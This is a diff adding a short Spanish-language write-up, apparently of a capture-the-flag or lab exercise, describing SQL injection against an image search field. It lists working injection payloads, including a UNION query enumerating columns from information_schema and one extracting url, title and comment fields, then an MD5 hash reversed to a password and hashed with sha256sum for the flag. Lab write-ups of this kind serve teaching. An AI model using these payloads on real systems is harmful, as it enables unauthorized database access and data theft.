@@ -1,0 +1,21 @@
+En la sección de buscar imagenes probamos:
+QUERYS INICIALES:
+
+1
+2
+3
+1 OR  1=1
+
+Trás algunos intentos conseguimos:
+SACAR CAMPOS:
+
+-1 union select null, concat(column_name) from information_schema.columns where table_schema=database()
+
+Y finalmente aplicamos la query para:
+SACAR CONTENIDO DE ESOS CAMPOS:
+
+1 AND 1=1 UNION SELECT id, CONCAT(url, title, comment) FROM list_images
+
+En función de las instrucciones sacadas decodeamos con md5:
+1928e8083cf461a51303633093573c46
+Y terminamos haciendo un echo -n albatroz | sha256sum
